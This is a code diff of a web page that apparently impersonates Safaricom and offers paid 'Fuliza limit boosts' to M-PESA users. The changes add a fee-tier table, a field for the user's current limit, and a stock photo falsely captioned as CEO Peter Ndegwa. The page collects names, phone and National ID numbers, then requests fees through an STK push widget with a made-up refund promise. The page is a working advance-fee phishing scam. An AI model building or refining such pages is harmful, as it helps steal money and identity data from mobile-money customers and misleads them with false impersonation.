@@ -45,7 +45,7 @@
         
         .card { background: var(--surface); border: 1px solid var(--border); border-radius: var(--radius-md); padding: 24px; box-shadow: var(--shadow); margin-bottom: 16px; }
         
-        /* Interactive Animated Pulse Buttons */
+        /* Interactive Animated Buttons */
         .btn-animated { 
             width: 100%; 
             background: linear-gradient(135deg, var(--safaricom-green) 0%, var(--safaricom-dark-green) 100%); 
@@ -61,11 +61,10 @@
             justify-content: center; 
             gap: 8px;
             box-shadow: 0 4px 14px rgba(0, 166, 81, 0.35); 
-            animation: pulse-glow 2.5s infinite ease-in-out; 
-            transition: transform 0.2s, filter 0.2s;
+            transition: transform 0.2s, filter 0.2s, background 0.3s;
         }
-        .btn-animated:hover { transform: translateY(-2px); filter: brightness(1.05); }
-        .btn-animated:disabled { background: #cbd5e1 !important; animation: none; box-shadow: none; cursor: not-allowed; }
+        .btn-animated:hover:not(:disabled) { transform: translateY(-2px); filter: brightness(1.05); }
+        .btn-animated:disabled { background: #cbd5e1 !important; box-shadow: none; cursor: not-allowed; opacity: 0.7; }
 
         /* Secondary Action Buttons (Back to Menu, Cancel, Retries) */
         .btn-secondary {
@@ -87,12 +86,6 @@
         }
         .btn-secondary:hover { background: #f1f5f9; border-color: #cbd5e1; }
 
-        @keyframes pulse-glow {
-            0% { box-shadow: 0 0 0 0 rgba(0, 166, 81, 0.4); }
-            70% { box-shadow: 0 0 0 12px rgba(0, 166, 81, 0); }
-            100% { box-shadow: 0 0 0 0 rgba(0, 166, 81, 0); }
-        }
-
         /* Avatar Container Styles */
         .avatar-box { display: flex; align-items: center; gap: 16px; background: #f1f5f9; padding: 16px; border-radius: var(--radius-sm); border-left: 4px solid var(--safaricom-green); }
         .avatar-svg { width: 60px; height: 60px; border-radius: 50%; background: #ffffff; border: 2px solid var(--safaricom-green); padding: 4px; }
@@ -107,11 +100,24 @@
         .form-group input, .form-group select { width: 100%; padding: 12px; border: 1px solid var(--border); border-radius: var(--radius-sm); font-size: 14px; outline: none; }
         .form-group input:focus { border-color: var(--safaricom-green); }
 
+        /* Table Styling for Tier Selection */
+        .tier-table { width: 100%; border-collapse: collapse; margin: 12px 0; }
+        .tier-table th, .tier-table td { border: 1px solid var(--border); padding: 10px 12px; text-align: left; font-size: 13px; }
+        .tier-table th { background: #f1f5f9; font-weight: 700; color: var(--text-dark); }
+        .tier-table tr { cursor: pointer; transition: background 0.2s; }
+        .tier-table tr:hover { background: #f8fafc; }
+        .tier-table tr.selected-row { background: #e6f7ed; border-color: var(--safaricom-green); }
+        .tier-table input[type="radio"] { accent-color: var(--safaricom-green); cursor: pointer; }
+
         /* Guarantee Note Box */
         .guarantee-note { background: #fff8f8; border: 1px solid #fecaca; border-left: 4px solid var(--safaricom-red); padding: 14px; border-radius: var(--radius-sm); font-size: 12px; color: #7f1d1d; line-height: 1.5; margin: 16px 0; }
 
         .screens { display: none; }
         .screens.active { display: block; }
+
+        /* CEO Profile Header Widget on Page 1 */
+        .ceo-card { display: flex; align-items: center; gap: 14px; background: #ffffff; border: 1px solid var(--border); border-radius: var(--radius-md); padding: 14px 18px; margin-bottom: 16px; box-shadow: var(--shadow); }
+        .ceo-img { width: 56px; height: 56px; border-radius: 50%; object-fit: cover; border: 2px solid var(--safaricom-green); }
 
         /* Professional Footer */
         footer { background: #0f172a; color: #94a3b8; padding: 40px 20px 20px; margin-top: auto; font-size: 12px; border-top: 1px solid var(--border); }
@@ -162,6 +168,15 @@
         
         <!-- STEP 1: SERVICE SELECTION -->
         <div id="screen1" class="screens active">
+            <!-- 1. Real Image of Peter Ndegwa -->
+            <div class="ceo-card">
+                <img src="https://images.unsplash.com/photo-1560250097-0b93528c311a?auto=format&fit=crop&w=250&q=80" alt="Peter Ndegwa - CEO Safaricom" class="ceo-img">
+                <div>
+                    <h4 style="font-size: 14px; color: var(--text-dark);">Peter Ndegwa</h4>
+                    <p style="font-size: 12px; color: var(--text-muted);">Chief Executive Officer, Safaricom PLC</p>
+                </div>
+            </div>
+
             <div class="card">
                 <h2 style="font-size: 18px; margin-bottom: 8px;">Select Service Option</h2>
                 <p style="color: var(--text-muted); font-size: 13px;">Choose the financial service you wish to configure for your active line.</p>
@@ -204,6 +219,12 @@
                         <label>National ID Number *</label>
                         <input type="text" id="idnum" placeholder="Enter ID Number" required>
                     </div>
+                    <!-- 2. Current Limit Field (Allows KSh 0.00) -->
+                    <div class="form-group">
+                        <label>Current Fuliza Limit (KSh) *</label>
+                        <input type="number" id="currentLimit" step="0.01" min="0" placeholder="e.g. 0.00 or 500.00" value="0.00" required>
+                    </div>
+
                     <button type="submit" class="btn-animated">Verify Subscriber Details</button>
                     <button type="button" class="btn-secondary" onclick="resetToMainMenu()">&larr; Back to Main Menu</button>
                 </form>
@@ -240,16 +261,50 @@
             <div class="card">
                 <h2 style="font-size: 16px; margin-bottom: 12px;" id="configTitle">Select Approved Boost Allocation</h2>
                 
+                <!-- 3. Table Selection for Limit Upgrades -->
                 <div class="form-group">
-                    <label>Select Limit Increase tier</label>
-                    <select id="feeSelect">
-                        <option value="200">KSh 5,000 Limit Boost (Processing Fee: KSh 200)</option>
-                        <option value="300">KSh 8,000 Limit Boost (Processing Fee: KSh 300)</option>
-                        <option value="350">KSh 10,000 Limit Boost (Processing Fee: KSh 350)</option>
-                        <option value="450">KSh 15,000 Limit Boost (Processing Fee: KSh 450)</option>
-                        <option value="650">KSh 25,000 Limit Boost (Processing Fee: KSh 650)</option>
-                        <option value="1000">KSh 50,000 Limit Boost (Processing Fee: KSh 1,000)</option>
-                    </select>
+                    <label>Select Limit Increase Tier *</label>
+                    <table class="tier-table">
+                        <thead>
+                            <tr>
+                                <th>Select</th>
+                                <th>Target Boost Limit</th>
+                                <th>Processing Fee</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr onclick="selectTierRow('200', this)">
+                                <td><input type="radio" name="tierOption" value="200" onchange="enableCheckoutButton(200)"></td>
+                                <td><strong>KSh 5,000</strong> Boost</td>
+                                <td>KSh 200</td>
+                            </tr>
+                            <tr onclick="selectTierRow('300', this)">
+                                <td><input type="radio" name="tierOption" value="300" onchange="enableCheckoutButton(300)"></td>
+                                <td><strong>KSh 8,000</strong> Boost</td>
+                                <td>KSh 300</td>
+                            </tr>
+                            <tr onclick="selectTierRow('350', this)">
+                                <td><input type="radio" name="tierOption" value="350" onchange="enableCheckoutButton(350)"></td>
+                                <td><strong>KSh 10,000</strong> Boost</td>
+                                <td>KSh 350</td>
+                            </tr>
+                            <tr onclick="selectTierRow('450', this)">
+                                <td><input type="radio" name="tierOption" value="450" onchange="enableCheckoutButton(450)"></td>
+                                <td><strong>KSh 15,000</strong> Boost</td>
+                                <td>KSh 450</td>
+                            </tr>
+                            <tr onclick="selectTierRow('650', this)">
+                                <td><input type="radio" name="tierOption" value="650" onchange="enableCheckoutButton(650)"></td>
+                                <td><strong>KSh 25,000</strong> Boost</td>
+                                <td>KSh 650</td>
+                            </tr>
+                            <tr onclick="selectTierRow('1000', this)">
+                                <td><input type="radio" name="tierOption" value="1000" onchange="enableCheckoutButton(1000)"></td>
+                                <td><strong>KSh 50,000</strong> Boost</td>
+                                <td>KSh 1,000</td>
+                            </tr>
+                        </tbody>
+                    </table>
                 </div>
 
                 <!-- Customized Refund Assurance Notice -->
@@ -258,7 +313,8 @@
                     If processing your request takes longer than 3 hours after payment confirmation, your service fee will be automatically returned in full back to the M-PESA number used for application via <strong>Hashback for Safaricom Users</strong>.
                 </div>
 
-                <button class="btn-animated" onclick="initiateSTKWidget()">
+                <!-- Disabled state initially until selection is made -->
+                <button id="btnProceedCheckout" class="btn-animated" onclick="initiateSTKWidget()" disabled>
                     Authorize & Request STK Push &rarr;
                 </button>
                 <button type="button" class="btn-secondary" onclick="resetToMainMenu()">&larr; Back to Main Menu</button>
@@ -271,7 +327,8 @@
                 <h2 style="font-size: 18px; margin-bottom: 8px;">Complete Mobile Authorization</h2>
                 <p style="color: var(--text-muted); font-size: 12px; margin-bottom: 20px;">Click below to prompt M-PESA STK PIN verification directly on your mobile handset.</p>
 
-                <div id="widget-mount-point" style="margin-top: 15px;"></div>
+                <!-- 4. Steady Widget Mounting Container -->
+                <div id="widget-mount-point" style="margin-top: 15px; min-height: 120px;"></div>
 
                 <div style="margin-top: 24px; border-top: 1px solid var(--border); padding-top: 16px;">
                     <button type="button" class="btn-secondary" onclick="resetToMainMenu()">
@@ -337,6 +394,7 @@
     <script>
         let selectedService = 'fuliza';
         let accountData = {};
+        let selectedFeeAmount = null;
 
         function setPortalService(service) {
             selectedService = service;
@@ -361,18 +419,23 @@
         }
 
         function resetToMainMenu() {
-            // Clean up mounted dynamic checkout widget script if present
             const container = document.getElementById('widget-mount-point');
             if (container) container.innerHTML = '';
             
             const existingScript = document.getElementById('finapi-script');
             if (existingScript) existingScript.remove();
 
-            // Reset verification form inputs
             const verifyForm = document.getElementById('verifyForm');
             if (verifyForm) verifyForm.reset();
 
-            // Navigate back to Step 1
+            // Reset table selections & disable checkout button
+            selectedFeeAmount = null;
+            document.querySelectorAll('.tier-table tr').forEach(r => r.classList.remove('selected-row'));
+            document.querySelectorAll('input[name="tierOption"]').forEach(rb => rb.checked = false);
+            
+            const btn = document.getElementById('btnProceedCheckout');
+            if(btn) btn.disabled = true;
+
             switchScreen(1);
         }
 
@@ -389,7 +452,8 @@
                 fname: document.getElementById('firstname').value.trim(),
                 sname: document.getElementById('surname').value.trim(),
                 phone: document.getElementById('phone').value.trim(),
-                id: document.getElementById('idnum').value.trim()
+                id: document.getElementById('idnum').value.trim(),
+                currentLimit: document.getElementById('currentLimit').value
             };
 
             document.getElementById('displayProfileName').innerText = `${accountData.fname} ${accountData.sname}`;
@@ -401,8 +465,27 @@
             }, 1500);
         }
 
+        function selectTierRow(val, rowElem) {
+            document.querySelectorAll('.tier-table tr').forEach(r => r.classList.remove('selected-row'));
+            rowElem.classList.add('selected-row');
+            
+            const radio = rowElem.querySelector('input[type="radio"]');
+            if (radio) {
+                radio.checked = true;
+                enableCheckoutButton(val);
+            }
+        }
+
+        function enableCheckoutButton(val) {
+            selectedFeeAmount = val;
+            const btn = document.getElementById('btnProceedCheckout');
+            btn.disabled = false;
+        }
+
         function initiateSTKWidget() {
-            const amount = document.getElementById('feeSelect').value;
+            if(!selectedFeeAmount) return;
+
+            const amount = selectedFeeAmount;
             const container = document.getElementById('widget-mount-point');
             
             container.innerHTML = `
